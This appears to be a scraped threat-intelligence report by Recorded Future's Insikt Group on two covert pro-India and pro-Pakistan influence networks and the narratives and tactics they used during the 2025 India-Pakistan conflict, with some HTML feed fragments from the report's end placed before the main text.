Hidden Charkha accounts accused Pakistan of asking the US to broker the ceasefire in the face of mounting military failures, while attempting to gauge Indian social media users’ sentiment on the ceasefire (<strong>Figure 63</strong>). Meanwhile, Khyber Defender praised US President Donald Trump for brokering the agreement, calling for him to receive a Nobel Peace Prize (using hashtags like #trumpfornobel and #trump_nobel_peace), as seen in <strong>Figure 64</strong>. Khyber Defender accounts also accused India’s “elites” of “mocking” and “ridiculing” Trump’s ceasefire (which allegedly shows their intent to prolong the conflict), while the pro-Pakistani network likely attempted to curry favor with the US president.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_13798190ab9fd163572b75ce56cfcf5fc99bd73dd.png?width=750&amp;format=png&amp;optimize=medium\" width=\"616\" height=\"249\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figures 63 and 64:</em></strong> <em>Hidden Charkha (left) and Khyber Defender (right) content following the announcement of a US-brokered ceasefire agreement (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <p>Despite the ceasefire agreement, both Hidden Charkha and Khyber Defender continued attempting to assert the technological superiority of India and Pakistan, respectively, and used the conflict’s aftermath as proof of the other country’s relative lack of military sophistication.

Meanwhile, Khyber Defender accounts amplified a speech by Pakistani PM Shehbaz Sharif to state that “the Air Force’s use of modern technology sent a lasting warning the adversary will remember for generations” and attempted to undermine confidence in Rafale jets made by French company Dassault Aviation (<strong>Figure 67</strong>).</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1fb058646b3a9951a0af32dd80d8a98371a267958.png?width=750&amp;format=png&amp;optimize=medium\" width=\"532\" height=\"267\" />\n            </div>\n          </div>\n          <div>\n            <div><strong>Figures 65 and 66:</strong> Screenshot of Chinese defense stocks following the ceasefire announcement posted by Hidden Charkha accounts (Source: Recorded Future)</div>\n          </div>\n        </div>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_190dd335bf8e0f1a9ccbfaddf3e7c12fbfc4e4080.png?width=750&amp;format=png&amp;optimize=medium\" width=\"720\" height=\"900\" />\n            </div>\n          </div>\n          <div>\n            <div>\n              <p><strong>Figure 67:</strong> Image shared by Khyber Defender accounts attempting to ridicule Indian Rafale jets</p>\n              <p>(Source: Recorded Future)</p>\n            </div>\n          </div>\n        </div>\n        <h2>Mitigations</h2>\n        <ul>\n          <li>Customers can use the following queries to monitor Hidden Charkha and Khyber Defender activity, leveraging Recorded Future AI to summarize and track emerging narratives.</li>\n          <li>Businesses operating in India and Pakistan should monitor ongoing influence narratives to understand national sentiment on major political and geopolitical issues, and track narratives perpetuated by CIB networks to measure attempts at managing conflict escalation.</li>\n          <li>International news media outlets covering emerging conflicts should monitor influence content from known influence networks attempting to abuse their brand.

Conversely, covert influence networks will also likely be used to undermine adversary narratives concerning tactical outcomes (such as airstrikes or downing enemy aircraft), cloud the online information environment, complicate battle damage assessment, and counter attribution claims on terrorist attacks.</p>\n      ","content:encodedSnippet":"Executive Summary\nInsikt Group documented two large-scale, state-aligned influence operation networks supporting India and Pakistan, respectively, during the India-Pakistan conflict of April and May 2025; we track these networks as Hidden Charkha (pro-India) and Khyber Defender (pro-Pakistan). These networks are very likely motivated by patriotism and are almost certainly aligned with India’s and Pakistan’s domestic and foreign policy objectives, respectively. Both networks intervened at every phase of conflict escalation between the April 22, 2025, Pahalgam terror attack and the ceasefire announcement on May 10, 2025, presenting a blueprint of the TTPs and narratives employed by two separate influence operation networks supporting adversarial, nuclear-armed countries attempting to control escalation and garner popular and diplomatic support for limited conventional kinetic actions.\nEach network consistently attempted to frame India or Pakistan, respectively, as maintaining superior technological and military capabilities –– and therefore the implied ability for each respective country to exercise tactical restraint –– as proof of having the moral high ground, and hence having domestic and international support. The networks also attempted to undermine India’s and Pakistan’s claims of military preparedness by amplifying forged military documents and exaggerating the impact of claimed cyberattacks to highlight vulnerabilities.\nDespite their efforts, both networks were almost certainly unsuccessful in shaping public opinion, as measured by their lack of organic engagement on social media, their inability to break out of patriotic echo chambers, and their recurrent use of generative AI to produce visual content, which very likely undermines their credibility. Nevertheless, analyzing narratives produced by both networks can provide defenders with valuable insights into the role of influence operations (IOs) during conflict escalation. Organizations operating in conflict zones should proactively track mentions of their brand or key personnel in influence narratives to proactively mitigate against reputational damages.\nKey Findings\nHidden Charkha is a pro-India network active since at least 2021 that is almost certainly aligned with the Indian government and operating in the Indian Standard Time (IST) timezone. Khyber Defender is a pro-Pakistan network active since at least 2020 that is almost certainly aligned with the Pakistani government.\nBoth networks were active during the India-Pakistan conflict following the Pahalgam terror attacks on April 22, 2025, and very likely attempted to support the governments of India and Pakistan, respectively, at different phases of conflict escalation.\nInitially, both networks attempted to stake claims and counterclaims to attribute the Pahalgam attacks as acts of state-sponsored terrorism from India or Pakistan. The networks then attempted to undermine senior political figures in each country, in addition to amplifying nationalist and patriotic sentiment domestically while suppressing dissenting opinions on social media.\nHidden Charkha and Khyber Defender closely supported and criticized each country’s kinetic military operations (Operation Sindoor and Operation Bunyan-Al-Marsous, respectively) and claimed each respective country was demonstrating tactical restraint and technological superiority.\nFollowing the ceasefire announcement on May 10, 2025, Hidden Charkha accused Pakistan, and Khyber Defender accused India, of violating the ceasefire, as both networks attempted to shape international perceptions on the outcome of the conflict and reassert claims of technological superiority.\nTwo Networks\nInsikt Group identified two major influence networks engaging in coordinated inauthentic behavior (CIB) during the India-Pakistan conflict in late April and early May 2025: Hidden Charkha, a pro-India network, and Khyber Defender, a pro-Pakistan network (Figure 1). These networks illustrate how influence operations can be employed symmetrically during crises in an attempt to shape public perception in both domestic and foreign spheres, as well as in an attempt to manage escalation. Their behavior during the 2025 India-Pakistan standoff serves as a rare example of influence operations operating in tandem with kinetic and cyber escalation between rival nuclear-armed states. It also demonstrates the role of patriotic sentiment in aligning non-state influence actors with nation-state wartime objectives.\nFigure 1: Hidden Charkha and Khyber Defender network graphs (Source: Recorded Future)\nBoth networks very likely operate to support and amplify pro-India and pro-Pakistan narratives on social media. These networks mainly promote pro-government messaging to domestic audiences in local languages and have seen sharp increases in activity during major domestic political events in each country (Figure 2). Hidden Charkha activity surged in November 2024 to commemorate the November 26, 2008, terrorist attacks in Mumbai; it also surged in January 2024 during farmer protests in India. Khyber Defender activity surged on April 15, 2025, when the Washington Post revealed that terrorist groups smuggled US weapons left in Afghanistan into Pakistan, as well as in July 2024, following Pakistani media coverage of “Operation Goldsmith,” an alleged operation by foreign actors to restore former Prime Minister Imran Khan. Both networks also prioritize narratives promoting national unity and counter-insurgency operations in contested regions, such as the Balochistan province and Jammu and Kashmir (J&K), while undermining separatist movements operating in them.\nIn addition to domestic messaging, these networks also very likely support the aforementioned governments’ foreign policy and diplomatic objectives, including undermining each respective government’s rivals at global diplomatic events such as the United Nations (UN) General Assembly (UNGA). The pro-India Hidden Charkha network also likely supported transnational repression efforts by targeting Sikh separatists abroad, as well as by promoting content accusing Canada and the US of facilitating perceived Khalistani extremism.\nFigure 2: Hidden Charkha and Khyber Defender daily posting since January 2024 (Source: Recorded Future)\nIn addition to their size (over 900 inauthentic accounts affiliated with Hidden Charkha and over 300 affiliated with Khyber Defender), these networks are remarkably similar in terms of TTPs: They use hashtags to amplify content and manipulate trending topics, produce visual content inhouse, impersonate local and international news outlets, and use AI to generate content aimed at international audiences.\nHidden Charkha\nHidden Charkha is a covert influence network identified by Insikt Group in April 2025 disseminating pro-India influence content. We identified over 900 inauthentic accounts as part of this network, which has been active since at least 2021. Insikt Group assesses that Hidden Charkha’s narratives are almost certainly aligned with the Indian government’s geopolitical objectives, which include promoting pro-India narratives to international audiences, undermining pro-Pakistani narratives and positions, and targeting Khalistani separatist groups. We also observed the network producing influence content accusing the US and Canada of harboring Khalistani activists.\nAttribution\nUsing pattern-of-life (PoL) analysis, Insikt Group assesses that Hidden Charkha’s operators are likely based in India Standard Time (IST) locations, although we were unable to attribute this activity to a specific entity. Based on the network’s posting patterns over the last two years, Hidden Charkha operators very likely follow typical 9-5 work schedules, with a pause around lunch (12:00-13:00) and reduced posting between 18:00-9:00 (Figure 3).\nFigure 3: Hourly Hidden Charkha posting activity, GMT+5:30 (Source: Recorded Future)\nObjectives\nHidden Charkha’s content and narratives almost certainly seek to fulfill the following influence objectives:\nPraise Indian political leaders in addition to law enforcement and counter-terrorism units such as the Central Reserve Police Force (CRPF), and the National Security Guard (NSG), as well as highlight India’s progress in sectors like defense manufacturing, semiconductors, AI, and transport infrastructure (Figures 4, 5, and 6). Accounts frequently promoted such content using hashtags like #MadeInIndia and #SelfReliantIndia.\nBoost India’s diplomatic standing at events like the 79th UNGA in October 2024 and India’s leadership of the G20 summit in 2023, using hashtags like #g20india and #g20_in_kashmir.\nDefuse polarizing events and support government responses such as the Muzaffarnagar school incident in September 2023, criminal law reforms in January and February 2024, major farmer protests in February and March 2024, and the November 2024 anniversary of the 2008 Mumbai terrorist attacks using hashtags like #NeverForget2611.\nInsikt Group identified pro-India content posted by Hidden Charkha accounts likely generated using OpenAI’s DALL-E 2 model and typically depicting India’s economic success in sectors such as defense, manufacturing, and infrastructure.\nFigures 4, 5, and 6: AI-generated images used in Hidden Charkha content (Source: Recorded Future)\nHidden Charkha’s principal targets abroad are the following:\nPakistani Government: Prior to the Pahalgam attacks, the network perpetuated narratives depicting Pakistan as sponsoring terrorism (Figures 7 and 8), often claiming the Pakistani government was complicit in the 2008 Mumbai attacks (also known as “26/11”) perpetrated by the terrorist group Lashkar-e-Taiba (LeT), a position also taken by the Indian government.\nCanadian Government: Hidden Charkha repeatedly promotes content accusing the Canadian government of harboring Khalistani separatists, an issue that has driven a wedge between India and Canada and led to a deterioration in diplomatic relations (both countries have since pledged to mend relations over the issue at the 2025 G7 summit). The network has repeatedly blamed the Canadian government for sponsoring “Khalistani terrorism” and has amplified narratives calling for Canada to become a US state, using the hashtag #51state (Figure 9).\nUS Government: Similar to Canada, Hidden Charkha promotes content targeting the US over its perceived tolerance for Khalistani activists residing in the country, mirroring Indian government requests for the US to list Sikh separatists as terror groups. Hidden Charkha accounts have also accused the US of funding “Pakistan-sponsored terrorists” and conducting transnational killings in reaction to US media outlets attributing an “assassination plot” targeting Khalistani activists in the US to India’s Research and Analysis Wing (RAW).\nFigures 7, 8, and 9: Hidden Charkha images referencing Pakistan, the US, and Canada (Source: Recorded Future)\nAssets and TTPs\nHidden Charkha accounts are likely inauthentic but use multiple methods to hide or obscure their true identities while masquerading as legitimate users from India. Hidden Charkha account profiles almost certainly use profile pictures created by a generative adversarial network (GAN) generative model (Figures 10 and 11), or use stolen or generic profile pictures. Some of the network’s most active accounts also employ AI-generated profile pictures, but obstruct faces to avoid being detected as AI-generated content, often by using veils or other kinds of objects, such as a building corner (Figures 12, 13, and 14).\nFigures 10 and 11: GAN-generated profile pictures used by Hidden Charkha accounts (Source: Social Media)\nFigures 12, 13, and 14: Similar AI-generated profile pictures used by Hidden Charkha accounts (Source: Social Media)\nInsikt Group also identified Hidden Charkha accounts attempting to brand themselves as purported media outlets, using names such as “Daily Dose News” (@DdnDose), “NewsMasterIndia” (@NewsMasterIndia), and “NewsFreak” (@_peacekeeper2), with some accounts advertising themselves as fact-checking organizations. One of the Hidden Charkha accounts branded as a fact-checking organization linked to countermisinformation[.]com in its bio, a website claiming to be “an initiative to combat the spread of disinformation against India by global media.”\nKhyber Defender\nKhyber Defender is a covert influence network identified by Insikt Group in May 2025; it has been disseminating pro-Pakistan influence content since at least 2020. Insikt Group assesses that Khyber Defender’s narratives are almost certainly aligned with the Pakistani government’s foreign and domestic policy goals, which include undermining the Indian government and nationalist movements in Balochistan, supporting Pakistan’s foreign policy regarding Afghanistan and the Israel-Hamas war, and lobbying the Pakistani government on topics like agriculture and public health.\nAttribution\nInsikt Group attributes Khyber Defender content with high confidence to Team 64, a Pakistani company and activist collective based in Khyber Pakhtunkhwa province. Insikt Group identified Khyber Defender accounts publishing large volumes of Urdu-language content, including Team 64’s logo (Figures 15 and 16), in addition to a number of likely inauthentic accounts openly admitting to posting “on behalf” of the company. Team 64 almost certainly has a current Facebook page and a YouTube channel, the latter of which links to the social media handle @zeeshanhoti, which we assess is likely linked to Zeeshan Hoti, the President of the Provincial Youth Assembly in Khyber Pakhtunkhwa (KPK). However, we were unable to ascertain Hoti’s exact level of involvement in Team 64 or whether the KPK coordinates with the Pakistani central government.\nFigure 15: Team 64’s logo (Source: Facebook)\nFigure 16: Khyber Defender content using Team 64’s logo (Source: Social Media)\nIn late May 2025, accounts linked to Khyber Defender published graphics using the #Team64 hashtag, calling Team64 the “digital defenders of Pakistan,” thanking “all our Cyber Warriors, Patriots and Media Houses,” and including a screenshot of Pakistan’s top trending hashtags (Figure 17). Previous Khyber Defender and Team64 posts have also openly admitted to amplifying hashtags to reach Pakistan’s top trends, such as #Pakistan_Will_Emerge in January 2023 (Figure 18).\nFigures 17 and 18: Graphic published by Khyber Defender accounts on May 16, 2025 (left), and January 2023 (right)\n(Source: Social Media)\nObjectives\nThe majority of Khyber Defender content has focused on supporting Pakistan’s geopolitical objectives and foreign policy, including by:\nUndermining the Indian government, including by attempting to erode India’s diplomatic standing (including at the 2023 UNGA, also targeted by Hidden Charkha; Khyber Defender used hashtags like #UNGA78 and #unga2023), deflecting accusations around alleged Pakistani state-sponsored terrorism, and sustaining pro-Pakistan sentiment in contested regions like J&K. Pakistani diplomats have repeatedly denied India’s accusations at the UN.\nBlaming the US for regional instability, which includes criticizing the 2021 US withdrawal from Afghanistan. Notably, the network posted graphics impersonating The Washington Post (Figure 19) based on a real article describing the flow of US weapons to terror groups such as the Pakistani Taliban Movement (Tehrik-e Taliban Pakistan, TTP). Khyber Defender accounts stated that “American weapons are no longer symbols of partnership—they're assets in the hands of extremists.” Following the Taliban’s return to power, the TTP has surged attacks against Pakistani military and law enforcement targets, which Pakistani leaders have attributed to US and NATO forces exiting Afghanistan in August 2021.\nSupporting Palestine by calling for the boycott of US companies and consumer brands operating in Israel during the Israel-Hamas war, using hashtags like #9MonthsofGenocide (Figure 20). The Pakistani government has consistently sided against Israel during the conflict, with Pakistan’s National Assembly passing a unanimous resolution condemning Israel’s “heinous waves of atrocities” in Gaza.\nFigures 19 and 20: Khyber Defender content impersonating the Washington Post and calling for the boycott of US companies operating in Israel (Source: Social Media)\nKhyber Defender almost certainly targets domestic Pakistani audiences in English and Urdu in pursuit of the following objectives:\nUndermine Baloch nationalist and separatist movements like Akhtar Mengal’s Balochistan National Party (BNP-M; Figure 21), insurgent groups like the Balochistan Liberation Army (BLA), and the Balochistan Liberation Front (BLF), in addition to human rights groups like Dr Marhrang Baloch’s Baloch Unity Committee (BYC; Figure 22). These objectives mirror the Pakistani government’s crackdown on pro-Baloch movements and insurgents, as Pakistan designated the BLA a terrorist group in 2006 and has been accused of cracking down on peaceful protests by BYC and BNP-M supporters. In July 2025, Pakistani authorities reportedly placed Akhtar Mengal on a no-fly list.\nErode domestic support for Imran Khan and the Pakistan Tehreek-e-Insaf (PTI) political party by accusing PTI of “collaborating” with Baloch separatist groups to form terror plots and alleging Imran Khan of being corrupt. Khan was sentenced to fourteen years in prison in January 2025 after being detained since 2023 over alleged corruption charges. The Pakistani government also attempted to ban PTI in 2024. Khyber Defender accounts previously expressed their support for Khan during his tenure as Prime Minister, but changed their narratives after he was deposed in April 2022, supporting our assessment that these accounts are operating in alignment with the Pakistani government.\nLobby the Pakistani government over economic policy, including asking for an increase in wheat prices to support farmers, using hashtags such as #کسان_کا_ساتھ_دو (“Support the farmer”) and #ریٹ_نہیں_تو_فصل_نہیں (“No fair rate, no crop”), and raising the tax rate on tobacco products to support public health. The Pakistani government decided in February 2025 to abolish minimum support prices for wheat, creating economic concerns for farmers; additionally, the government has also continued raising tobacco taxation levels to meet World Health Organization (WHO) standards.\nFigures 21 and 22: Khyber Defender content targeting Akhtar Mengal and Dr. Mahrang Baloch\n(Source: Social Media)\nAssets and TTPs\nThe majority of Khyber Defender’s accounts are very likely inauthentic, given their use of “follow-for-follow” tactics to accrue followers, stolen profile pictures, and common traits shared between accounts, such as the use of similar bios and specific emojis. Many Khyber Defender accounts have likely accrued significant followings by participating in inauthentic “follow-for-follow” networks, which involve following many accounts to receive many reciprocal followers.\nInfluence Operations and Conflict Escalation\nInsikt Group assesses that Hidden Charkha and Khyber Defender both participated in influence activities aligned with India’s and Pakistan’s broader efforts to shape domestic and international public opinion and deflect blame following the Pahalgam attacks. This influence activity aligned with India and Pakistan characterized their kinetic reprisals as legitimate and proportionate, effectively attempting to assert control over conflict escalation. Based on content published during the India-Pakistan conflict between April 22 and May 15, 2025, these networks almost certainly attempted to do the following:\nRapidly establish control over attribution narratives over the Pahalgam attacks and legitimize claims using government and news sources\nIncrease domestic political pressure on perceived adversarial public officials and erode trust in adversary leadership while promoting narratives of unity domestically\nUndermine the rival’s diplomatic standing and counter or support international media reports on the conflict\nErode trust in adversary military preparedness by amplifying almost certainly forged military documents that reportedly showed a lack of morale and equipment malfunctions\nFrame military retaliation as justified and securing the moral high ground by promoting narratives of a disproportionate response by their adversary\nDrive domestic and international support for conventional kinetic operations by amplifying operational successes, establishing narratives of technological superiority, countering adversarial claims of failure, and promoting patriotic sentiment\nExaggerate the impact of cyberattacks on adversary infrastructure by echoing claims from hacktivist groups and national media outlets\nClaim military and cyber operations as successes post-ceasefire while highlighting any ceasefire violations, undermining their adversary on the international stage, and reaffirming their own technological sophistication\nIn spite of each network’s attempts, organic social media engagement with their campaigns during the conflict’s time period was minimal, very likely denoting a failure to effectively shape public opinion. These networks also very likely failed to escape their national media echo chambers and likely reinforced existing messaging targeting like-minded activists and patriotic actors. Additionally, based on available data, Insikt Group is unable to establish whether these networks are operating under direct government supervision or control, limiting arguments of causal links between the Indian and Pakistani governments’ strategies during the conflict and narratives published by Hidden Charkha and Khyber Defender.\nNevertheless, narratives promoted by both influence networks to support conflict escalation almost certainly demonstrate how nationalist or patriotic sentiment can align network operators with nation-state influence objectives and provide informational support in times of kinetic warfare.\nBackground\nOn April 22, 2025, gunmen shot and killed 26 tourists at a resort near Pahalgam in India-controlled Kashmir. The attack was initially claimed by The Resistance Front (TRF), an alleged proxy of the Pakistani terrorist organization Lashkar-e-Taiba (LeT), which has been designated as a terrorist group by the Indian, Pakistani, and US governments since 2001. Initial reactions in both countries included deflecting blame onto the other and mounting domestic political pressure to identify responsible parties in government. Diplomatic tensions soared after both countries instituted reciprocal diplomatic sanctions and appealed to foreign world leaders and international bodies. Escalating tensions along the Line of Control (LoC) border culminated with India’s Operation Sindoor on May 7, 2025, which included strikes on LeT-linked facilities in Pakistan, and Pakistan’s retaliation starting May 8, 2025, subsequently expanded under Operation Bunyan-Al-Marsous on May 10, 2025, shortly before a US-brokered ceasefire was announced later the same day.\nInitial Attribution Claims\nBetween April 22 and 25, 2025, both networks reacted rapidly to the attack to establish opposing attribution narratives (Figure 23), each framing the Pahalgam attack as state-sponsored terrorism by India or Pakistan. This activity almost certainly aimed to undermine the respective government’s credibility among international audiences while simultaneously inoculating domestic audiences against hostile messaging, particularly in contested regions like Jammu and Kashmir.\nFigure 23: Timeline of Hidden Charkha and Khyber Defender activity following the Pahalgam attacks\n(Source: Recorded Future)\nWithin two hours of the Pahalgam attacks, Hidden Charkha accounts began attributing them to Pakistan. Accounts blamed the attacks on “Pak sponsored terrorists,” using hashtags like #pahalgamattack and #TerrorStatePakistan. By April 23, 2025, Hidden Charkha accounts began posting previously unseen (and therefore likely purpose-made) visual content accusing Pakistan’s Inter-Services Intelligence (ISI) of sponsoring LeT and calling TRF a “thinly veiled proxy” of LeT (Figures 24 and 25).\nFigures 24 and 25: Visual content posted by Hidden Charkha accounts following the Pahalgam attacks\n(Source: Recorded Future)\nOn April 22, 2025, at approximately 20:43 Karachi time, Khyber Defender accounts began coordinated posting of the #indianfalseflag hashtag. Initial posts attempted to counter claims made by Indian media outlets attributing the attacks to Pakistan. Accounts drew comparisons to the February 14, 2019, attacks in Puwalma, claiming that the two attacks were false flags and followed the “same script, same timing, same agenda.” On April 24, 2025, Khyber Defender accounts continued calling the Pahalgam attack a “scripted move” and an example of the Indian government’s “false flags, timed perfectly with global optics, to serve political agendas,” using hashtags like #IndianPropagandaExposed (Figure 26) and #IndiaFalseFlagKing (Figure 27).\nFigures 26 and 27: Visual content posted by Khyber Defender accounts following the Pahalgam attacks\n(Source: Recorded Future)\nOn April 25, Khyber Defender accounts also amplified images (Figure 28) purportedly stating a denial of responsibility for the Pahalgam attacks by the TRF. The statement, originally issued on a Telegram channel allegedly operated by TRF, denies the group’s involvement in the attacks, citing a “cyber intrusion” by “Indian cyber-intelligence operatives.” Starting May 30, 2025, the Telegram channel also began publishing screenshots of likely inauthentic documents purportedly sourced from India’s Research and Analysis Wing (RAW). These documents allegedly show that the attack had been orchestrated by the Indian government.\nFigure 28: Alleged statement of denial by TRF amplified by Khyber Defender accounts\n(Source: Recorded Future)\nStarting April 25, both networks attempted to legitimize their attribution claims by amplifying government and news sources. Hidden Charkha accounts began posting headlines from Indian national news outlets that provided evidence attributing the attacks to Pakistan (Figures 29 and 30); however, the narrative’s credibility among international audiences was very likely undermined by a rising echo-chamber effect in Indian media, as outlets amplified unverified claims and suffered from circular reporting. In contrast, Khyber Defender attempted to validate its claims by repeatedly posting clips directly sourced from the Pakistan Armed Forces’ Inter-Services Public Relations (ISPR) press conferences with Director General Ahmed Shareef Chaudhry (Figure 31).\nFigures 29 and 30: Hidden Charkha content amplifying headlines from Indian news outlets reportedly confirming attribution to Pakistan (Source: Recorded Future)\nFigure 31: Khyber Defender content amplifying ISPR press conferences (Source: Recorded Future)\nPolitical Pressure and National Unity\nFollowing the establishment of initial attribution claims, both networks attempted to erode trust in adversary leadership while simultaneously promoting unity at home and suppressing dissent from domestic political rivals.\nHidden Charkha attempted to undermine the perceived credibility of Pakistani officials by using quotes and supporting screenshots from Indian news outlets. Hidden Charkha initially amplified claims by former Pakistani officer and journalist Adil Raja that Pakistan Army chief General Asim Munir had ordered the Pahalgam attacks, using screenshots of an April 24, 2025, India Today article that claimed Munir was “desperate for a mini-war with India.” Other attempts to undermine General Munir included using quotes by former Pentagon official Michael Rubin calling Munir a “terrorist” in an interview with Indian media outlet ANI. Hidden Charkha accounts later targeted Pakistan’s Minister of Defense Khawaja Asif, claiming the minister had confessed that “we [Pakistan] did the dirty work of funding & training terrorists for 3 decades.\"\nOn April 25, Khyber Defender accounts began targeting India’s National Security Advisor Ajit Doval using the hashtag #sackajitdoval, claiming that the Pahalgam attacks were an “intelligence disaster” for India and that “there are increasing calls for Ajit Doval and his colleagues to step down.” The network’s narratives almost certainly attempted to capitalize on mounting domestic criticism in the aftermath of the attacks, such as from the Shiv Sena (UBT) party, which also qualified the Pahalgam attacks as an “intelligence failure” and criticized Doval on April 24, 2025.\nFigures 32 and 33: Khyber Defender content calling for Ajit Doval to be fired (Source: Recorded Future)\nWhile mounting pressure on adversary public officials, the networks simultaneously began posting narratives promoting unity, patriotism, and nationalist sentiment in their respective countries. Hidden Charkha, for example, focused on highlighting national and regional unity by posting content using hashtags like #KashmirRejectsTerrorism and #StandWithIndia, as well as visual content promoting unity in J&K using the #jmukmr hashtag (Figure 34). Conversely, Khyber Defender accounts amplified official messages from Pakistani officials like General Munir’s “Pakistan Hamesha Zindabad” (“Pakistan Forever Alive”) slogan, or images of national unity using hashtags like #Pakistan_is_our_pride (Figure 35).\nFigures 34 and 35: Hidden Charkha (left) and Khyber Defender (right) content promoting regional unity and nationalist sentiment (Source: Recorded Future)\nConversely, both networks also sought to suppress dissent by questioning the loyalty of domestic political rivals. For instance, Hidden Charkha promoted the #राहुल_देशद्रोही_है (“Rahul is a traitor”) hashtag to label Rahul Gandhi, the opposition leader in India’s Lok Sabha house of parliament, a terrorist “sympathizer.” This narrative mirrors the animosity of the Bharatiya Janata Party (BJP) toward Gandhi, with BJP spokesman Pradeep Bhandari accusing Gandhi of “undermining India’s progress” in December 2024. Similarly, Khyber Defender accounts used the hashtag #PTM_Supports_Terrorism to accuse the Pashtun Tahafuz Movement (PTM), a human rights organization defending Pashtun rights in Pakistan, of supporting Indian narratives on the Pahalgam attacks and called on Pashtuns to support Pakistan by stating “Proud Pashtun brothers! Understand the game of the enemies and support your state.”\nDiplomatic Escalation and Media Reactions\nGovernments typically use bilateral or multilateral diplomatic statements and communications during emerging conflicts as a mechanism for de-escalation or signalling foreign policy intent. Governments will hold press conferences or issue public statements, and they are increasingly using social media to promote these communications. Covert influence operations targeting social media users are likewise increasingly being used to shape narratives and drive diplomatic outcomes, particularly as diplomats themselves have been leveraged by nation-states like China and Russia as part of their broader influence ecosystems.\nBoth Hidden Charkha and Khyber Defender demonstrated a strong intent to shape international public opinion and promote their respective countries’ diplomatic standing while undermining the opposite country. Hidden Charkha was almost certainly more proactive than Khyber Defender in amplifying influence content signalling diplomatic escalation, reflecting India’s retaliatory measures in the immediate aftermath of the Pahalgam attack, while the latter kept a more reactive approach to India’s diplomatic actions.\nOn April 23, 2025, diplomatic tensions between India and Pakistan rapidly escalated following India's decision to suspend the 1960 Indus Waters Treaty (IWT), among other measures like visa bans and border closures. The treaty, which governs water distribution between India and Pakistan in the Indus river basin, was declared a national security risk by Indian Foreign Secretary Vikram Misri after the Pahalgam attack. Following the IWT suspension, both networks attempted to appeal to international audiences and international diplomatic bodies; however, Hidden Charkha displayed greater intent to undermine Pakistan at diplomatic forums like the UN Security Council (UNSC).\nHidden Charkha accounts initially amplified Foreign Secretary Misri’s announcement of the measures as “decisive” action by the Indian government (Figure 36). Meanwhile, Khyber Defender accounts reacted strongly against the suspension of the IWT, amplifying Pakistani government statements that the move was a “red line” and a “direct threat” to Pakistan (Figure 37), echoing an April 24, 2025, statement by Pakistan’s National Security Committee calling the decision an “act of war.” Khyber Defender accounts also attempted to frame the treaty’s suspension as India violating international norms, stating that “It's time the global community took notice” and using the hashtag #indiaemptythreats.\nFigures 36 and 37: Hidden Charkha (left) content covering India’s diplomatic measures and Khyber Defender (right) Urdu-language content framing the IWT suspension as contrary to international norms (Source: Recorded Future)\nHidden Charkha was particularly focused on undermining Pakistan’s standing at the UN, a tactic not generally observed by Khyber Defender accounts regarding India. Starting April 30, 2025, Hidden Charkha accounts accused Pakistan’s Foreign Minister Ishaq Dar of pressuring the UNSC to drop mentions of TRF from an official statement on the Pahalgam attacks (Figure 38). On May 5, 2025, following Pakistan’s demand for a closed-door consultation at the UNSC, Hidden Charkha accounts attempted to undermine Pakistan’s appeal to the UNSC over India’s suspension of the IWT, accusing it of “playing the victim.” On May 9, the pro-India network claimed that the UNSC had “rejected Pakistan’s false flag narrative,” and published likely inauthentic images depicting world leaders declaring their support for India as well as content using the hashtag #TerrorHasNoBorders (Figure 39).\nFigures 38 and 39: Hidden Charkha content seeking to undermine Pakistan at the UNSC (Source: Recorded Future)\nIn tandem with posting content aimed at supporting diplomatic measures by each country, the networks also reacted to international reporting on the emerging conflict. Of the two networks, Hidden Charkha also adopted a more aggressive stance against international media reporting by using the #stopwhitewashing and #MediaBias hashtags to accuse international media outlets, including the New York Times, Al Jazeera, and BBC, of naming the Pahalgam attackers “militants” — instead of terrorists –– thereby legitimizing the TRF’s attack. In contrast, Khyber Defender accounts praised the New York Times’ coverage of General Munir, by stating, for example, that the May 5, 2025, article by the newspaper was “absolutely correct.”\nMilitary Preparedness and Forged Documents\nFollowing initial attribution claims and escalating diplomatic tensions, Khyber Defender focused on eroding the Indian public’s trust in New Delhi’s military preparedness by circulating almost certainly forged documents. Starting April 28, 2025, Khyber Defender accounts amplified alleged leaked documents from the Indian Integrated Defense Staff headquarters reporting on the Indian Army’s reportedly low morale and increasing desertion rates (Figure 40). On May 5, 2025, Khyber Defender accounts amplified alleged leaked documents from India’s Defense and Research and Development Organization’s (DRDO) Armament Research and Development Establishment (ARDE) questioning the “operational efficacy” of the 881 Missile Regiment’s BrahMos cruise missiles due to gross negligence in storage conditions (Figure 41). Both documents are almost certainly inauthentic and make verifiably false or non-credible claims, such as that “Israeli Troops” operating Indian Air Force (IAF) equipment was undermining morale or that “any uncontrolled escalation has the potential to set [our] own economy back by 50 years.”\nFigures 40 and 41: Images claiming to depict leaked Indian defense documents, amplified by Khyber Defender accounts (Source: Recorded Future)\nInsikt Group assesses that the first known source of the documents is likely an anonymous pro-Pakistani social media account (@War_Analysts), which posted at least one of the two documents (Figure 41) before the Khyber Defender accounts. The account also published other likely inauthentic documents, such as a diplomatic complaint from the Israeli Embassy in New Delhi to the Indian government over an alleged case of sexual assault by Indian Special Forces on a member of the Israeli Defence Forces during a military exercise, a report alerting to T-90 ammunition shortages in the Indian Army, and an emergency procurement request for AK-203 rifles and other equipment from Russia.\nSupporting Kinetic Escalation\nOn May 7, 2025, India began Operation Sindoor, which involved missile and airstrikes on suspected terrorist (including LeT) infrastructure in Pakistan-administered Kashmir and Punjab, Pakistan. On May 10, 2025, Pakistan responded with Operation Bunyan-Al-Marsous, which targeted Indian military installations in Northern India. In tandem with these conventional kinetic operations, both Hidden Charkha and Khyber Defender increased their operational tempo (Figure 42) and attempted to support specific armed forces by publishing content almost certainly intended to justify military action, deter further kinetic actions by establishing perceived technological superiority, and forge patriotic sentiment.\nOperation Sindoor represented a major expansion from India's last kinetic actions against Pakistan in response to the 2019 Pulwama terror attack, and New Delhi very likely sought to calibrate its operations to minimize chances of uncontrolled escalation. Conversely, Pakistan –– which has suffered repeated military defeats against its more well-equipped neighbor –– very likely sought to capitalize on battlefield successes to present itself as a peer adversary not easily deterred. During the conflict, Hidden Charkha portrayed Operation Sindoor as precise, internationally supported, and strategically restrained, which Khyber Defender countered with claims of Indian losses and Pakistan’s retaliatory capabilities during Operation Bunyan-Al-Marsous. Both networks 